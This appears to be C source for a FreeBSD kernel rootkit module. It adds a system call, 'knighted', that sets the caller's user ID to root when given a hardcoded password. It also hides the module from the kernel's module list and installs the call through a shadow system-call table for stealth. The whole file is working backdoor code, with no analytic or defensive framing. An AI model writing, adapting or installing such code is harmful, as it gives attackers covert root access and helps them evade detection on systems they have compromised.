#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/sysproto.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/malloc.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/ucred.h>
#include "kld_hiding.h"
#include "magick.h"
#include "shadow_sysent.h"

#define KLD_NAME T_NAME"_knighted"
#define KLD_FILE_NAME T_NAME"_knighted.ko"

struct knighted_args{
   char * pass;   // password
};

/* System call to give the calling process root privileges. */
static int knighted (struct thread *td, void *syscall_args) {
   struct knighted_args * uap = (struct knighted_args *)syscall_args;
   int error = 0;
   size_t max_chars = 16;
   size_t done;
   char user_pass[max_chars];

   error = copyinstr(uap->pass, &user_pass, max_chars, &done);

   // Quick and dirty password check
   if (error == 0 && (strcmp(T_NAME, user_pass) == 0)) {
      struct proc *p;
      sx_xlock(&allproc_lock);
      p = td->td_proc;
      PROC_LOCK(p);
      p->p_ucred->cr_uid = 0;
      PROC_UNLOCK(p);
      sx_unlock(&allproc_lock);
   }

   return(error);
}

/* The sysent for the new system call. */
static struct sysent knighted_sysent = {
   knighted, /* implementing function */
   NULL,
   1,        /* number of arguments */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg) {
#ifndef DEBUG
   kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
#endif
   int error = 0;
   int syscall_num = offset;

   switch (cmd) {
      case MOD_LOAD:
         INSERT_SHADOW_ENTRY(KNIGHTED_INDEX, knighted, syscall_num);
#ifdef DEBUG
         uprintf("[-] knighted module loaded at sys call num %d\n",
            syscall_num);
#endif
         break;
      case MOD_UNLOAD:
         UNDO_SHADOW_ENTRY(KNIGHTED_INDEX);
#ifdef DEBUG
         uprintf("[-] knighted module unloaded from sys call num %d\n",
            syscall_num);
#endif
         break;
      default:
         error = EOPNOTSUPP;
         break;
  }

   return(error);
}

MODULE_VERSION(knighted, 1);
SYSCALL_MODULE(knighted, &offset, &knighted_sysent, load, NULL);
MODULE_DEPEND(MODNAME, shdw_sysent_tbl, 1, 1, 1);
